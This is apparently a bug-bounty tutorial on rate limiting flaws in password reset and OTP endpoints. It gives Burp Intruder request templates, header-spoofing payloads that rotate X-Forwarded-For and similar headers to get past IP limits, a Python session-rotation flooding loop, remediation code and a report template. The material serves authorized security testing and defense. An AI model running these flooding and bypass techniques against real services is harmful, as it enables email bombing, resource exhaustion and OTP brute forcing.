## Introduction

Rate limiting vulnerabilities represent a critical security weakness where applications fail to restrict the number of requests a user can make within a specific timeframe. This comprehensive guide covers the technical aspects of identifying, testing, and understanding these vulnerabilities from an ethical hacking perspective.

**Severity**: Medium to High (depending on context)  
**CVSS Base Score**: Typically 5.0-7.5  
**CWE ID**: CWE-307 (Improper Restriction of Excessive Authentication Attempts)

## Vulnerability Overview

### What is a Rate Limiting Vulnerability?

A rate limiting vulnerability occurs when an application fails to implement proper controls on the frequency or volume of requests from a single source. This allows attackers to:

- Send unlimited password reset requests
- Generate excessive OTP (One-Time Password) codes
- Perform brute force attacks without throttling
- Cause Denial of Service (DoS) conditions
- Abuse API endpoints for resource exhaustion

### Common Vulnerable Endpoints

- `/forgot-password`
- `/send-otp`
- `/verify-email`
- `/login`
- `/register`
- `/api/send-verification`
- `/resend-code

### Root Causes

1. **Missing CAPTCHA Implementation**: No challenge-response mechanism to differentiate humans from bots
2. **Absent Rate Limiting Logic**: No server-side restrictions on request frequency
3. **Lack of WAF (Web Application Firewall)**: No protection against automated attacks
4. **Insufficient Logging and Monitoring**: Attacks go undetected
5. **Client-Side Only Validation**: Easily bypassed security controls

---

## Technical Background

### How Rate Limiting Should Work

```
Request → Rate Limit Check → [Within Limits?] 
                                    ↓
                         Yes ←     No
                          ↓         ↓
                    Process    Block/Throttle
```

### Common Rate Limiting Techniques

1. **Fixed Window Counter**: Count requests in fixed time windows (e.g., 5 requests per minute)
2. **Sliding Window Log**: Track timestamps of individual requests
3. **Token Bucket**: Allow burst traffic with gradual token replenishment
4. **Leaky Bucket**: Process requests at constant rate, queue excess

---

## Attack Vectors

### Vector 1: Password Reset Flooding
**Impact**: Email inbox flooding, resource exhaustion, potential account takeover preparation

### Vector 2: OTP Bruteforce
**Impact**: Ability to enumerate valid OTPs, account compromise

### Vector 3: Email Verification Spam
**Impact**: Email service abuse, user harassment, reputational damage

### Vector 4: API Endpoint Abuse
**Impact**: Server resource exhaustion, increased infrastructure costs



## Practical Testing Methodology

### Prerequisites

**Tools Required**:
- Burp Suite (Community/Professional Edition)
- Web browser (Firefox/Chrome with proxy settings)
- Email account for testing
- Target application with proper authorization

### Method 1: Basic Rate Limit Testing via Burp Suite Intruder

#### Step 1: Account Setup and Reconnaissance

1. **Create Test Account**
   ```
   Email: your-test-email@domain.com
   Username: testuser123
   Password: SecurePass123!
   ```

2. **Initial Functionality Testing**
   - Navigate through all major features
   - Document all forms and submission endpoints
   - Identify password reset and OTP generation flows
   - Check for existing security controls (CAPTCHA, delays, etc.)

3. **Logout and Prepare for Testing**

#### Step 2: Capture Password Reset Request

1. **Configure Burp Suite**
   ```
   Proxy → Options → Proxy Listeners → Ensure 127.0.0.1:8080 is running
   Browser → Proxy Settings → Manual → 127.0.0.1:8080

2. **Intercept Mode**
   - Open Burp Suite
   - Navigate to `Proxy → Intercept`
   - Enable "Intercept is on"

3. **Trigger Password Reset**
   - Go to application's forgot password page
   - Enter your test email address
   - Click "Send Reset Link" or "Send OTP"

4. **Capture the Request**
   ```
   POST /api/forgot-password HTTP/1.1
   Host: target-website.com
   Content-Type: application/json
   Content-Length: 45
   
   {"email":"your-test-email@domain.com"}
   ```

#### Step 3: Send to Repeater for Analysis

1. **Right-click captured request → "Send to Repeater"**
2. **Navigate to Repeater tab**
3. **Click "Send" to verify request works**
4. **Observe response**:
   ```json
   {
     "status": "success",
     "message": "Password reset link sent",
     "code": 200
   }
   ```

5. **Test Multiple Manual Sends**
   - Click "Send" 5-10 times rapidly
   - Check if all requests return success
   - Verify your email receives all reset links
   - **If all succeed → Vulnerability confirmed**

#### Step 4: Automated Testing with Intruder

1. **Send request to Intruder**
   - Right-click in Repeater → "Send to Intruder"

2. **Configure Attack Type**
   - Navigate to `Intruder → Positions`
   - Click "Clear §" to remove auto-selected positions
   - Select attack type: **Sniper**

3. **Set Payload Position**
   
   Find the `Accept-Language` header or add a custom header:
   ```
   POST /api/forgot-password HTTP/1.1
   Host: target-website.com
   Accept-Language: en-US,en;q=§0.9§
   Content-Type: application/json
   
   {"email":"your-test-email@domain.com"}
   ```

4. **Configure Payloads**
   - Navigate to `Intruder → Payloads`
   - Payload type: **Numbers**
   - Settings:
     ```
     Type: Sequential
     From: 1
     To: 30 (or 50, 100 for thorough testing)
     Step: 1
     ```

5. **Start Attack**
   - Click "Start Attack"
   - Monitor the results table
   - Check for:
     - Status codes (all 200 = no rate limiting)
     - Response times
     - Response lengths (identical = successful)

6. **Verify Impact**
   - Check email inbox
   - Count received emails (should match number of requests)
   - Document with screenshots

#### Step 5: Documentation

**Evidence Collection**:
- Screenshot of Burp Intruder results showing 30+ successful requests
- Screenshot of email inbox with multiple reset emails
- Time difference between first and last email (e.g., "30 emails in 15 seconds")
- HTTP request/response samples

---

### Method 2: IP Restriction Bypass via Header Manipulation

Many applications implement basic IP-based rate limiting but fail to properly validate proxy headers.

#### Step 1: Baseline Testing

1. Capture password reset request in Burp Repeater
2. Send 5-10 requests rapidly
3. Document if rate limiting triggers (e.g., "Too many requests" error)

#### Step 2: Header Injection

1. **Add X-Forwarded-For Header**
   
   Modify the captured request:
   ```
   POST /api/forgot-password HTTP/1.1
   Host: target-website.com
   X-Forwarded-For: 127.0.0.1
   Content-Type: application/json
   
   {"email":"your-test-email@domain.com"}
   ```

2. **Test Single Request**
   - Send modified request
   - Verify it still works

#### Step 3: Automate IP Rotation

1. **Send to Intruder**
2. **Configure Payload Position**
   ```
   POST /api/forgot-password HTTP/1.1
   Host: target-website.com
   X-Forwarded-For: 127.0.0.§1§
   Content-Type: application/json
   
   {"email":"your-test-email@domain.com"}
   ```

3. **Payload Settings**
   ```
   Type: Numbers
   From: 1
   To: 255
   Step: 1
   ```

4. **Start Attack**
   - Each request appears to come from different IP
   - Bypasses IP-based rate limiting
   - Monitor success rate

#### Step 4: Alternative Headers to Test

Try these header variations:
```
X-Forwarded-For: 192.168.1.§1§
X-Real-IP: 10.0.0.§1§
X-Originating-IP: 172.16.0.§1§
X-Remote-IP: 192.168.100.§1§
X-Client-IP: 127.0.0.§1§
```

---

### Method 3: Session-Based Bypass

Some applications tie rate limits to session tokens rather than IP addresses.

#### Step 1: Multi-Session Testing

1. **Open multiple browser profiles or incognito windows**
2. **Generate new session for each**
3. **Test if each session has independent rate limit**

#### Step 2: Automated Session Rotation

```python
# Example concept (for educational purposes)
import requests

def test_rate_limit_with_sessions():
    url = "https://target-website.com/api/forgot-password"
    email = "test@example.com"
    
    for i in range(50):
        session = requests.Session()  # New session each time
        response = session.post(url, json={"email": email})
        print(f"Request {i+1}: {response.status_code}")
```


### Method 4: Parameter Manipulation

#### Testing Different Parameters

Sometimes rate limits apply per parameter value:

1. **Test with variations**:
   ```json
   {"email":"test@example.com"}
   {"email":"test+1@example.com"}
   {"email":"test+2@example.com"}
   ```

2. **Use email aliasing**: Gmail ignores dots and plus signs
   ```
   original: testuser@gmail.com
   alias1: test.user@gmail.com
   alias2: testuser+1@gmail.com
   ```

3. **Test if each variant resets the counter**

---

## Remediation Strategies

### For Developers

#### 1. Implement Server-Side Rate Limiting

```python
# Example using Flask-Limiter (Python)
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

@app.route("/api/forgot-password", methods=["POST"])
@limiter.limit("5 per hour")
def forgot_password():
    # Password reset logic
    pass
```

#### 2. Add CAPTCHA/reCAPTCHA

```html
<!-- Google reCAPTCHA v3 -->
<script src="https://www.google.com/recaptcha/api.js"></script>
<form>
  <div class="g-recaptcha" data-sitekey="your_site_key"></div>
  <!-- form fields -->
</form>
```

#### 3. Implement Progressive Delays

```javascript
// Exponential backoff example
const attempts = getUserAttempts(email);
const delay = Math.min(1000 * Math.pow(2, attempts), 32000); // Max 32 seconds
setTimeout(() => sendResetEmail(email), delay);
```

#### 4. Use WAF Rules

```
# ModSecurity rule example
SecRule RESPONSE_STATUS "@streq 429" \
  "id:1,phase:3,deny,status:429,\
   msg:'Rate limit exceeded'"
```

#### 5. Multi-Layer Protection

- **Application Layer**: Code-level rate limiting
- **Web Server Layer**: Nginx/Apache rate limiting
- **WAF Layer**: Cloud WAF (Cloudflare, AWS WAF)
- **Infrastructure Layer**: DDoS protection

### Detection and Monitoring

```yaml
# Example alert rule
alert:
  condition: password_reset_requests > 10 in 5 minutes
  from: single_ip OR single_email
  action: 
    - block_ip
    - notify_security_team
    - log_incident
```

---

## Impact Assessment

### Business Impact

| Impact Type | Severity | Description |
|------------|----------|-------------|
| Email Flooding | Medium | Inbox spam, user frustration |
| Resource Exhaustion | High | Increased server costs, potential downtime |
| Account Takeover Risk | High | When combined with other vulnerabilities |
| Reputation Damage | Medium | Loss of user trust |
| Compliance Violation | High | GDPR, PCI-DSS implications |

### Technical Impact

- **Server Load**: Increased CPU, memory, bandwidth usage
- **Email Delivery**: IP reputation damage, blacklisting
- **Database Strain**: Excessive writes for tokens/OTPs
- **Monitoring Overload**: Alert fatigue from security systems


## Report Template for Bug Bounty

```markdown
## Title: No Rate Limiting on Password Reset Endpoint

### Severity: Medium

### Description:
The application's password reset functionality at `/api/forgot-password` 
lacks proper rate limiting controls, allowing an attacker to send unlimited 
password reset requests for any email address.

### Steps to Reproduce:
1. Navigate to https://target.com/forgot-password
2. Intercept the password reset request using Burp Suite
3. Send the request to Intruder
4. Configure payload for 50 requests
5. Execute attack
6. Observe all 50 requests succeed with 200 status code

### Proof of Concept:
[Include screenshots]
- Burp Intruder results showing 50 successful requests
- Email inbox showing 50 received emails
- Timeline showing all requests completed in <30 seconds

### Impact:
- Email flooding/spam for targeted users
- Resource exhaustion (email servers, application servers)
- Potential DoS condition
- Foundation for more sophisticated attacks

### Recommended Fix:
1. Implement rate limiting (e.g., 3 requests per hour per email)
2. Add CAPTCHA verification
3. Implement progressive delays
4. Add monitoring and alerting
5. Consider email confirmation before sending reset link

Happy security:)
